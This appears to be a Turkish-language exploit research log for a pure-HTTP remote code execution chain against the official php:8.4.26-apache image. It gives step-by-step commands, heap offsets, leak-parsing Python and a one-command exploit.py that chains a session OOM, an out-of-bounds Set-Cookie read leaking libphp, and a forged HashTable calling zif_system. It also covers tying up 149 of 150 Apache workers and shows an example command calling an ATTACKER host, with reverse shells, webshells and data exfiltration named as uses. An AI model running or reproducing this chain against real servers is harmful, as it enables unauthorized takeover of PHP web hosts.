# Resmi 128M / display_errors=Off saf HTTP ilerlemesi (2026-10-22, pure/)

Hedef: resmi `php:8.4.26-apache` (trixie, `php.ini-production`, resmi prefork
`MaxRequestWorkers=150`, `display_errors=Off`, `memory_limit=128M`,
`output_buffering=4096`, files session handler) üzerinde **saf HTTP** zinciri: gdb
iliştirmeden, hedef `/proc`'u okumadan, yapılandırmayı değiştirmeden.

Bu belge yalnızca bu turda `pure/` altında yapılan bağımsız deneyleri kaydeder;
`de0/`, `tools/` içindeki diğer çalışmalarla çakışmamak için.

## 0. Sonuçlara hızlı bakış

1. **Yeni primitif: `Transfer-Encoding: chunked` ile `post_max_size` atlatma.**
   `Content-Length` olmadığında `SG(request_info).content_length = 0` olur,
   `rfc1867_post_handler`'ın `post_max_size` kontrolü atlanır; multipart parser
   doğrudan dechunk edilmiş istek gövdesini okur. Fiilen 10MB / 63MB body normal şekilde
   parse edildi; aynı body `Content-Length: 10MB` ile gönderildiğinde session başlatmaya girmez.
2. **Saf HTTP A1 (send_cookie OOM) çoğaltıldı** (`pure/mk_a1.py` +
   `pure/chunked_send.py`): resmi yapılandırma, gdb yok, yanıt 500, gdb gözlemi
   `php_url_encode` girişinde `fs128len=0 / free_pages=0 / rsize=limit`,
   `PS(send_cookie)=1`, `PS(id)` sarkan, `PS(mod_data)` sıfır-olmayan olduğunu doğruluyor.
3. **query string, A'nın `PS(id)` / `PS(mod_data)` / basedir'ini
   page 0x56'nın farklı bin-40 slotlarına taşıyabilir**: her 8 karakterlik adı olan query
   parametresi md slotunu +2 yapar (iki key kopyası), id/basedir sayfası buna göre değişir.
4. **Saf HTTP sınır-dışı okuma aşıldı** (gdb yok, 3/3):
   - A: `mk_a1.py --big 78` (varsayılan parts/fillers/burners/progress=4000),
     URL `/index.php?q0000000=v&...&q0000004=v` (5 adet 8 karakterlik parametre),
     chunked gönderim → 500.
   - B: `mk_leak_b.py --spec "A:0x137"×24 --fake-len 0x2000 --tag`,
     chunked gönderim → **200 OK**, `Set-Cookie` çözümlendiğinde 8192 bayt:
     `/02BBBBB` + 8184 baytlık A dönemi heap artığı (residual), içinde 62 chunk içi işaretçi.
   - Okuma uzunluğu 0x80000'e (512KB) ve 0xC8000'e (800KB) kadar ayarlanabilir, yanıt 1.5–2.3MB
     olsa da normal döner; işaretçiler 2MiB hizalı kümelenir, **doğrudan chunk base'i verir**.
5. **libphp sızıntısı elde edildi** (artık pencerenin "tam olarak" HashTable artığı içermesine gerek yok):
   B içinde 14 adet `G:511:0x137` tam-blok forge değeri, 1 adet `G:400:0x137`
   (id'nin bulunduğu chunk'ın page 0x137'sinde kapanır), ardından 1 adet
   `G:511:0x137`, en son 900 adet iç içe dizi alanı `X:900` konur. G:400'ün değeri id
   chunk'ında 111 sayfalık boşluk (pages 0x191..0x1ff) bırakır, `X` alanlarının gerçek
   `HashTable`/Bucket zinciri Best-Fit ile bu deliklere yerleşir, onun
   `pDestructor = zval_ptr_dtor` olur. 800KB pencerede bu işaretçi **1095 kez** görünür,
   böylece `libphp = değer - 0x65EB60`. Aynı zamanda pencerede 2MiB hizalı bir
   işaretçi kümesinin sayımı 87'dir, kümelenince tam olarak **main chunk base**'i verir.
6. **Saf HTTP tam zincir RCE aşıldı**: kök dizindeki `exploit.py` (`pure/pwn_pure.py`
   takma ad olarak tutulur) tek komutla şunları tamamlar:
   A1 (OOM) → B1 (sınır-dışı okuma, aynı anda libphp + main chunk hesaplar) → A2
   (cheap-OOM) → B2 (fake-ref + sahte HashTable, `pDestructor=zif_system`)
   → hedef içinde `id` yürütme. Tek worker baseline **20/20**; resmi worker
   (`MaxRequestWorkers=150`, önce 149 child işgal edilir) **10/10**, tek seferde ~3–4 saniye,
   sabitlenen worker yeniden başlamaz, hedef hâlâ resmi `php.ini-production`
   (`display_errors=Off`, 128M).

## 1. chunked ile post_max_size atlatma (kanıt)

```
# 10MB multipart body, chunked:
python3 pure/chunked_send.py --port 18110 --body-file /tmp/body10m.bin
  -> body=10486026 resp=259 HTTP/1.1 200 OK
  gdb: SESSINIT isabet (END cleanup çalışır), url_encode 132B tahsisi başarılı
# aynı body Content-Length: 10486026 ile:
  -> SESSINIT yok, session başlatma yok (handler başında return)
```

Ana nokta: `rfc1867_post_handler` yalnızca girişte `content_length`'i karşılaştırır; chunked
isteklerde `content_length=0`. `multipart_buffer_fill` doğrudan `sapi_module.read_post`'u çağırır,
`post_max_size` sayımı yoktur. Apache varsayılan `LimitRequestBody=0`. Dolayısıyla istediğimiz
kadar büyük bir multipart body (>8MB) göndererek heap şekillendirmesi yapabiliriz.

## 2. Saf HTTP A1 (send_cookie OOM)

`pure/mk_a1.py`'nin varsayılan şekli (= daha önce gdb ile kalibre edilen OOM şekli):

```
PHPSESSID=\0
860 adet depth-64 iç içe boş dosya alanı (index0: filename="A", CT=103B;
                              index1: filename="A", CT=231B; geri kalan filename="")
14 adet 103B ad / 8B değer filler (iç içe alanlardan sonra)
78 adet 8000B büyük değer (filler'dan sonra)
20 adet 4000B burner
PHP_SESSION_UPLOAD_PROGRESS = 'k'*4000   ← son sayfa tüketicisi
```

Fiilî test (resmi yapılandırma, gdb yok): HTTP 500; URL breakpoint
`fs128len=0 rsize=0x8000000 limit=0x8000000 fp=0`;
`PS(send_cookie)=1`, `PS(id)=chunk+0x137000`,
`PS(mod_data)=chunk+0x560a0/page 0x56 slot4`, basedir=gerçek string işaretçisi.
OOM stack'i: `zend_mm_safe_error ← zend_mm_alloc_pages ← zend_mm_alloc_small_slow
← php_url_encode ← php_session_reset_id ← php_session_initialize
← php_session_rfc1867_callback`.

Dikkat: `progress` değeri aynı zamanda smart_str key'inin tahsis kaynağıdır, 4000 bayt
url_encode'dan önceki son sayfayı tüketmek için kullanılır; keyfi olarak kısaltmayın.

## 3. query string ile A'nın END tahsis slotunu taşımak

A'nın `PS(mod_data)`'sı (40B ps_files), A sonundaki `s_open`'ın bin-40
free-list head'ine yaptığı ecalloc'tan gelir; `PS(id)` (create_sid) bin-64 head'den gelir.
query string, `_GET` aşamasında (`_POST`'tan önce) bin-40/bin-64 string'leri tahsis eder,
dolayısıyla bu head'leri kaydırabilir:

| A'nın query'si | md slotu (page 0x56) | id page | basedir page |
|---|---|---|---|
| yok | slot4 | 0x137 | 0x1f3 |
| 1×`qqqqqqqq=v` | slot6 | 0x137 | 0x1f1 |
| 2× | slot8 | 0x137 | 0x1c1 |
| 3× | slot10 | 0x137 | 0x1e9 |
| 5× | slot14 | 0x137 | 0x007 |
| 2×`q…=v*48` (BIG=74) | slot8 | 0x1dc | 0x1c1 |

Kural: her 8 karakterlik adı olan parametre (1B değer) md slotunu +2 yapar; 40–63B değer (bin-64)
id sayfasını iter. `BIG` da fs64 head'i etkiler (BIG 74→78 iken id page 0x1dc→0x137),
tüm kalibrasyonlar çiftli belirlenmeli (query şekli + BIG/BURN/F128).

## 4. "Aynı adrese close" neden kullanılamaz ve kullanılabilir güvenli close

### 4.1 Aynı adres (s_open'ın ecalloc'u stale md'ye isabet eder)

gdb ile `heap->free_slot[4]` md'ye ayarlanarak doğrulandı: `ps_close_files`'ın kapattığı şey
tam olarak az önce ecalloc edilen yeni ps_files'tır (last_key=0, basedir=yeni string, fd=-1),
close'un kendisi güvenlidir; ancak ardından `PS(mod_data)` serbest bırakılmış bloğa işaret eder,
`s_read` başarısız olur ve `php_session_abort()`'u tetikler, bir kez daha close yapar ve bu da
bin-40 çifte-free'ye (double free) yol açar:

```
WMD[1] ecalloc(md)            -> 0
WMD[2] ps_close_files frees   -> free-list next
WMD[3] zend_llist_add_element -> llist element md'ye tahsis edilir
WMD[4] php_session_abort close-> list element'i (hâlâ SG(headers) içinde) free eder
WMD[5] sapi_send_headers md'yi tekrar tahsis eder -> element->next/prev üzerine yazar
...
Program received signal SIGSEGV in _efree <- zend_llist_destroy
                                    <- sapi_deactivate_module <- php_request_shutdown
```

`zend_llist_element` 39B'dir (bin-40), tam olarak md'ye düşer; çifte-free sonrası free list
kendine döner (self-loop), çıktı aşamasının varsayılan `Content-Type` elemanı md'yi yeniden kullanır,
`zend_llist_destroy` bozulmuş bir `header` işaretçisi okur (fiilen rdi = ASCII `"ext/html"`) → SIGSEGV.
mod_php, `php_request_shutdown`'dan **sonra** ap_pass_brigade yaptığı için yanıt kaybolur.

### 4.2 Güvenli close (şu anda kullanılan yol)

`s_open`'ın ecalloc'unun başka bir slot almasını sağlamak (B'nin bin-40 head'i page0x56 slot1'dir),
A'nın md'si B'nin free-list'ine düşsün ama zincirin başında olmasın (ör. slot6/slot8/slot14):

- `last_key` = bir sonraki free slot işaretçisi (mapped) → release yalnızca bir çıkarma yapar;
- `basedir` = korunan A dönemi "/tmp" işaretçisi;
- `efree(md)` bin-40'ın SRUN sayfasına düşer → güvenli;
- kilit ek koşul: **basedir'in refcount'u 1 olmamalı**, aksi hâlde
  `zend_string_release_ex(basedir)` bir cached chunk'ın FRUN sayfasına efree yapar →
  `zend_mm_panic`.

501/511 sayfalık flood değeriyle basedir'in bulunduğu chunk'ı canlandırıp sayfalarının üzerine
yazıyoruz (refcount 0x41414141 ≠ 1 olur), böylece release no-op'a dönüşür.

## 5. Aşılmış saf HTTP sınır-dışı okuma (gdb yok, 3/3)

### 5.1 A

```
python3 pure/mk_a1.py --out a.bin --big 78
python3 pure/chunked_send.py --port 18110 --body-file a.bin \
  --path "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
# -> HTTP/1.0 500
```

Etki (gdb ile çapraz kontrol, yalnızca teşhis amaçlı): `md = main+0x56230` (page 0x56 slot14;
`main`, A1'in ZendMM main chunk'ıdır), id chunk ise `main-0x6c9000`'de,
`PS(id) = (id chunk)+0x137000`, `send_cookie=1`; `basedir` page 0x007'de
(flood değeriyle üzerine yazılır).

### 5.2 B

`pure/mk_leak_b.py`'nin alanı 311 sayfalık bir LRUN'dur (`A` ile doldurulmuş), veri
page 0x137'de biter ve sahte bir `zend_string` başlığı yazılır:

```
data_start = chunk + 0x1000 + 0x18
id         = chunk + 0x137000
fake header at data offset 0x135FE8:
  +0x00 refcount = 0          (rshutdown release 0'a indirmez)
  +0x04 type     = 0x16       (IS_STRING|GC_NOT_COLLECTABLE)
  +0x08 h        = 0
  +0x10 len      = 0x2000
  +0x18 data     = "/02BBBBB" (ilk bayt sıfır-olmayan; '/' valid_key'i başarısız kılar)
L = 0x136008 -> size 0x136021 -> 311 pages (pages 1..311)
```

B ayrıca `PHPSESSID=a` (1B) ve `PHP_SESSION_UPLOAD_PROGRESS=k0` taşır; 24 adet
`A:0x137` alanı, 31 cached chunk'ın tümünü bir kez çekmeye yeter, böylece id chunk ile
basedir chunk'ın ikisi de 311 sayfalık değeri alır (id page ile basedir page ikisi de
pages 1..311 içinde).

```
python3 pure/mk_leak_b.py --out b.bin --spec "A:0x137,A:0x137,...,A:0x137" \
  --fake-len 0x2000 --tag
python3 pure/chunked_send.py --port 18110 --body-file b.bin --save-response b.resp
# -> HTTP/1.1 200 OK
# Set-Cookie: PHPSESSID=/02BBBBB<8184 bayt artık>
#   %2F ile başlar, URL decode sonrası uzunluk 8200
```

Sonuç (3/3, farklı ASLR):

```
run1 decoded=8200 head=b'/02BBBBB\x00df...'  62 chunk içi işaretçi, cluster=1
run2 decoded=8200 head=b'/02BBBBB\x003c...'  62 chunk içi işaretçi, cluster=1
run3 decoded=8200 head=b'/02BBBBB\x00ea...'  62 chunk içi işaretçi, cluster=1
```

Okuma uzunluğu parametresi `--fake-len` büyütülebilir:
`0x80000` → 524KB çözümlenir, 7521 işaretçi (tek chunk kümesi);
`0xC8000` → 819200 bayt (800KB) çözümlenir, ikinci bir 2MiB kümesi belirir (komşu/ilişkili chunk).
`0xD0000` (2MiB sınırını aşar) SIGSEGV yapar (sonraki 2MiB mutlaka eşlenmiş olmayabilir).
Tüm 0x7f… işaretçileri `& ~0x1fffff` ile kümelenir, **en büyük küme alınarak id chunk base elde edilir**.

### 5.3 Hayatta kalma zinciri (neden sonunda 200 dönebiliyor)

1. `s_open` ecalloc slot1'i alır (stale md=slot6 değil);
2. `ps_close_files(stale)`: last_key=slot7 (free slot, çıkarma güvenli),
   basedir refcount=0x41414141 (flood üzerine yazdı, no-op), efree(md) SRUN sayfasında;
3. `reset_id`, sahte 8192-len id ile Set-Cookie üretir (OOB okuma);
4. `php_session_track_init`;
5. `s_read`'in `php_session_valid_key`'i, id verisi '/' içerdiği için FAILURE döner →
   `php_session_abort()`'un kapattığı şey yeni, geçerli ps_files'tır (slot1) → güvenli;
6. cleanup içinde `flush(1)` `mod_data=NULL` görür, yazma/kapatmayı atlar;
7. `php_rshutdown_session_globals()` `PS(id)`'yi serbest bırakır: sahte başlık refcount=0 →
   0xFFFFFFFF'e düşer, free etmez;
8. script `echo "OK\n"` → `php_request_shutdown` eksiksiz çalışır →
   ap_pass_brigade normal şekilde 200 + Set-Cookie gönderir. worker yeniden başlamaz.

## 6. Sınır-dışı okumadan RCE'ye: saf HTTP tam zinciri

### 6.1 B1'in sızıntı yerleşimi (LEAK_SPEC)

```
LEAK_SPEC = "G:511:0x137" * 14 + "G:400:0x137" + "G:511:0x137" + "X:900"
--fake-len 0xC8000          # 800KB, id chunk'ın page 0x1f7'sine kadar kapsar
```

- `G:<pages>:0x137`: **tamamen doldurulmuş** forge değeri, kuyruğu page 0x137'de sahte
  `zend_string` başlığı yazar (rc=0, type=0x16, len=0xC8000, data="/xxBBBBB").
  id chunk'ın 511 sayfalık değeri pages 1..511'in tümünü işgal eder, aynı anda basedir chunk'ı
  canlandırır (refcount 0x41…'e yazılır, `zend_string_release`'in
  `zend_mm_panic` tetiklemesini önlemek için).
- `G:400:0x137`: yalnızca pages 1..400'ü işgal eder (sahte başlık hâlâ page 0x137'de), id chunk'ın
  kuyruğunda pages 0x191..0x1ff olmak üzere **111 sayfayı** boşaltır; Best-Fit ardından 900 adet
  `X` alanının HashTable/dizi tahsisini bu deliklere koyar, 800KB okuma penceresi page
  0x1f7'ye kadar kapsar, tam olarak onları okur.
- `X:900`: her alan `xNNNNN[a][a]…` (12 kat iç içe), değer `v`. Tahsis edilen şey
  **gerçek HashTable + Bucket zinciri**'dir, `pDestructor` libphp'nin
  `zval_ptr_dtor`'una işaret eder, bizim forge ettiğimiz bir sabit değil.

### 6.2 Pencere ayrıştırma (`exploit.py::parse_leak`)

`exploit.py` varsayılan olarak `--arch auto`'dur: sızıntı penceresindeki tekrar eden işaretçilerin
yüksek bitlerine göre otomatik olarak x86_64 (`0x7f…`) ya da aarch64 (`0xffff…`) seçer; açık
`--arch` üzerine yazabilir.

800KB çözümlendikten sonra qword bazında 0x7f… işaretçileri taranır, `& ~0x1fffff` (2MiB) ile kümelenir:

```
decoded=819208
most common heap qword = 0x7fa968bdeb60   # zval_ptr_dtor
  -> libphp = 0x7fa968bdeb60 - 0x65EB60 = 0x7fa968580000
chunk buckets:
  0x7fa966200000  7495   # id'nin bulunduğu chunk (pencerede çoğunlukla chunk içi işaretçiler)
  0x7fa968a00000  1095   # zval_ptr_dtor kümesi = libphp + 0x480000
  0x7fa966800000    87   # main chunk
  0x7fa966000000    79   # komşu chunk
```

- `libphp`: penceredeki **en çok görülen** chunk-olmayan işaretçiyi alıp
  `zval_ptr_dtor=0x65EB60`'ı çıkar.
- `main chunk`: libphp kümesini ve sayımı en büyük olan id kümesini dışladıktan sonra, sayımı
  **87**'ye en yakın olan kümeyi al. 87 işaretçinin tamamı main chunk'ın ilk 2MiB'ı içine düşer,
  bu yüzden küme adresi doğrudan main chunk base'dir.
- Makuliyet kontrolü: `libphp - main` mutlaka **0x1A00000–0x1F00000** aralığında olmalı
  (fiilen 0x1B99–0x1D80). Değilse, "en çok görülen işaretçi"nin başka bir modül/
  başka bir generation'ın tekrar eden değeri olduğu anlaşılır, bu sızıntı iptal edilir,
  A1+B1 yeniden çalıştırılır (`--retries`, varsayılan 3).

### 6.3 Stage-3 (bağımlılıklar `pure/` içine gömülü, saf HTTP)

```
S    = main + 0xF8398        # zend_array olarak forge edilecek konum
zif  = libphp + 0x465370     # zif_system
A2   = pure/cheap_oom_a.py --parts 880 --depth 64 --fillers 115
       -> hsv = main + 0x7D720 (PS(hash_serialize_verifier) heap'e işaret eder)
B2   = pure/mk_ht.py S zif "id>/out/p1" ht
       pure/fake_ref_b.py --vl 384 --n1 500 --n2 495 --rc 1 \
            --ht-addr S --ht-file ht
```

`fake_ref_b.py`, refcount'u 1 olan 384B'lık bir değerle `hsv`'yi S'ye işaret eden bir zval'e
üzerine yazar; S'deki sahte zend_array'in `pDestructor`'ı `zif_system`'dir,
`nApplyCount`/`arData` `"id>/out/p1"`'e işaret eder. İstek shutdown anında
`zend_hash_destroy`, `system(cmd)`'i çağırır, komut çıktısı `/out/p1`'e düşer.

### 6.4 Fiilî test ve kararlılık

```
[4/4] RCE OK; proof /home/debian/p2s-pure-1022/out/p1:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Tek worker baseline **20/20**: sembollü hata ayıklama imajında aynı worker ardışık 8 kez, her
  seferinde `--restart` ile yepyeni konteyner 7 kez; ayrıca **stock resmi imaj
  `php:8.4.26-apache`** üzerinde (gdb/sembol kurulu değil, konteyner içinde yalnızca resmi
  `php.ini-production` `php.ini` olarak kopyalanmış) 5/5 tekrar test. Her seferinde ~2 saniye,
  sabitlenen worker pid değişmez, hedef yapılandırma değişmez.
- Resmi worker (stock MPM: `StartServers 5`, `MaxRequestWorkers 150`)
  **10/10**: 18110'da 4 kez (3 kez aynı konteyner + 1 kez `--restart`), 18112'de
  6 kez (1 ilk çalıştırma + 3 aynı konteyner + 2 `--restart`); her seferinde ~3–4 saniye
  (149 yer tutucu bağlantı dahil).
- Sağlamlaştırmadan önce 1 başarısızlık oldu: o seferde pencerede en çok görülen qword
  `zval_ptr_dtor` değildi (çıkarılan libphp ile main arasında 0xCB80000 fark vardı).
  Şimdi yukarıdaki delta kontrolü böyle bir sızıntıyı doğrudan eler ve yeniden dener;
  başarısız tekrar, A2 tarafından bozulmuş worker adresini yeniden kullanmaz, tüm zinciri
  (A1+B1) baştan çalıştırır.
- Tüm zincir yalnızca HTTP kullanır (chunked multipart + sıradan GET/POST), teslim yolunda gdb
  iliştirilmez, hedef `/proc` okunmaz, hedef yapılandırma değiştirilmez.

### 6.5 Tek worker'dan resmi worker'a (MaxRequestWorkers=150)

Resmi imajın `mpm_prefork.conf`'u `StartServers 5`, `MaxRequestWorkers 150`'dir;
A1/B1/A2/B2 farklı child'lara düşerse, istekler arası sarkan işaretçiler oluşmaz. Saf HTTP'nin
çözümü **diğer child'ları doldurmak, yalnızca birini bırakmaktır**:

```text
1. MaxRequestWorkers-1 = 149 bağlantı aç, her biri yalnızca POST başlığı ve 1 baytlık body gönderir,
   Content-Length: 1048576; prefork her bağlantı için bir child tahsis eder ve
   read body noktasında bloke olur (Timeout varsayılan 60s, zincir yalnızca 3–4s sürer).
2. Geriye kalan tek boş child sırayla warm GET, A1, B1, A2, B2'yi işler;
   her istek bittikten sonra o yine tek boş child olur, bu yüzden dört adım mutlaka aynı prosese düşer.
3. Zincir bittikten sonra 149 bağlantı kapatılır, child'lar boş duruma döner.
```

Uygulama: `exploit.py --workers 150` (varsayılan değer). `--workers 1` tek worker baseline'a
döner, `--workers N` diğer `MaxRequestWorkers` yapılandırmaları için kullanılır. Dikkat: fazla
işgal etmeyin; N-1'den fazla bağlantı accept queue'ya girer, A1 bittikten sonra bunlar boş child'ı
önce kapar ve B1'i başka bir child'a iter. Resmi varsayılan dışındaki ortamlar için N'i açıkça verin.

## 7. Çoğaltma komutları (saf HTTP, gdb yok)

```bash
# Hedef konteyner: stock resmi php:8.4.26-apache + resmi php.ini-production
./pure/run_pure.sh                     # varsayılan p2s-pure-18110 / 18110
                                       # varsayılan resmi prefork (150 workers)
                                       # --single tek worker; --dbg sembollü imaj

# Tek komut: A1 -> B1 sızıntı -> A2 -> B2 -> system(cmd)
# varsayılan --workers 150 (149 child işgal eder); tek worker baseline için --workers 1
python3 exploit.py --port 18110
# Son iki satırda beklenen:
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Her seferinde konteyneri yeniden başlat (yeni ASLR):
python3 exploit.py --port 18110 --restart p2s-pure-18110

# Özel komut (reverse connect, webshell yazma, veri dışa aktarma vb.):
python3 exploit.py --port 18110 \
  --cmd 'php -r "file_get_contents(\\"http://ATTACKER/ok\\");"'
```

A1 / sınır-dışı okumayı ayrı ayrı çoğaltma:

```bash
# 1) A1: END-cleanup send_cookie OOM (5 adet 8 karakterlik query parametresi ile)
python3 pure/mk_a1.py --out /tmp/a.bin --big 78
python3 pure/chunked_send.py --port 18110 --body-file /tmp/a.bin \
  --path "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
# beklenen HTTP/1.0 500

# 2) B: forge değeri x16 + 900 dizi alanı, 819KB Set-Cookie OOB okuma
SPEC=$(python3 -c 'print(",".join(["G:511:0x137"]*14+["G:400:0x137","G:511:0x137","X:900"]))')
python3 pure/mk_leak_b.py --out /tmp/b.bin \
  --spec "$SPEC" --fake-len 0xC8000 --tag
python3 pure/chunked_send.py --port 18110 --body-file /tmp/b.bin \
  --timeout 300 --save-response /tmp/b.resp
# beklenen HTTP/1.1 200 OK; Set-Cookie çözümlendiğinde 819208 bayt
```

chunk base ve libphp'yi decode etme/alma:

```python
import urllib.parse, struct
from collections import Counter
raw=open("/tmp/b.resp","rb").read()
i=raw.find(b"Set-Cookie: PHPSESSID=")
v=raw[i+len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
dec=urllib.parse.unquote_to_bytes(v.decode("latin1"))
qs=[struct.unpack_from("<Q",dec,o)[0] for o in range(0,len(dec)-8,8)]
c=Counter(q & ~0x1fffff for q in qs if 0x7f0000000000 <= q <= 0x7fffffffffff)
print(hex(c.most_common(1)[0][0]))          # id chunk base
print(hex(Counter(qs).most_common(1)[0][0] - 0x65EB60))  # libphp
```

## 8. Dosyalar

| Dosya | Amaç |
|---|---|
| `pure/run_pure.sh` | Bağımsız konteyner `p2s-pure-18110` başlatır: varsayılan stock resmi `php:8.4.26-apache` + resmi `php.ini-production` + resmi prefork (150 workers); `--single` tek worker; `--dbg` sembollü imaj |
| `pure/docker/` | pure zincirinin kendi Docker varlıkları: `www/index.php` (hedef sayfa) ve resmi olmayan tek worker override'ı `apache-single-worker.conf`; kök dizin `docker/` yalnızca buraya işaret eden uyumluluk symlink'ini tutar |
| `pure/chunked_send.py` | chunked multipart body gönderir (post_max_size atlatma) |
| `pure/mk_a1.py` | A1 body (OOM şekli; query'yi `--path` ile verir) |
| `pure/mk_leak_b.py` | B body: `A:<page>` 311 sayfalık forge, `G:<pages>:<page>` tam-blok forge, `F/S` flood, `X:n` dizi alanı |
| `exploit.py` | **Tek komutla tam zincir**: A1 → B1 (libphp+main) → A2 → B2 → `system(cmd)`; delta kontrolü ve tekrar içerir (`pure/pwn_pure.py` onun takma adıdır) |
| `pure/cheap_oom_a.py` / `mk_ht.py` / `fake_ref_b.py` | stage-3 bağımlılıkları, `de0/`'dan gömülü, deponun kendi kendine yeterli olmasını sağlar |
| `pure/decode_cookie.py` | Yanıttaki `Set-Cookie`'yi decode eder, başlık/kümeleme/işaretçi sayımını yazdırır |
| `pure/mk_b_min.py` | Minimum B + slot şekillendirme alanı (kalibrasyon için) |
| `pure/mk_flood.py` | Erken dönem flood üreteci (korunuyor) |
| `pure/a1_probe.gdb` / `slots4*.gdb` / `force_b.gdb` / `force_watch_b.gdb` / `check_boundary.gdb` / `read_state.gdb` | Teşhis amaçlı gdb scriptleri (teslim yolu değil) |
| `pure/RESEARCH_PURE_128M.md` | Bu belge |
| uzak `~/p2s-pure-1022/evidence/e_r1..3.resp` | 3 kez 200 OK sınır-dışı okumanın ham yanıtları |
| uzak `~/p2s-pure-1022/evidence/pwn_pure_batch_20261022.log` | Sağlamlaştırma sonrası 6'lı ardışık vuruş (3 aynı worker + 3 yepyeni konteyner) tam zincir logu |
| `pure/evidence/pwn_pure_official_20261022.log` | stock resmi `php:8.4.26-apache` + resmi `php.ini-production` üzerinde 3'lü ardışık vuruş tam zincir logu |
| `pure/evidence/exploit_entry_20261022.log` | Kök dizindeki `exploit.py` ile `pure/pwn_pure.py` takma adının her biriyle 1'er tam zincir |
| `pure/evidence/official_workers_20261022.log` | Resmi worker (MaxRequestWorkers=150) üzerinde 4'lü ardışık vuruş tam zincir logu |

## 9. Kısıtlar ve sorumluluk reddi

- Tüm istek şekilleri resmi `php:8.4.26-apache` (trixie) build'ine, resmi
  `php.ini-production`'a, resmi prefork worker'a (varsayılan `MaxRequestWorkers=150`,
  diğer değerler için `--workers N`) bağlıdır; build/ini değişince yeniden kalibrasyon gerekir.
- Yalnızca yetkili ortamlarda güvenlik açığı araştırması ve çoğaltma amaçlıdır.
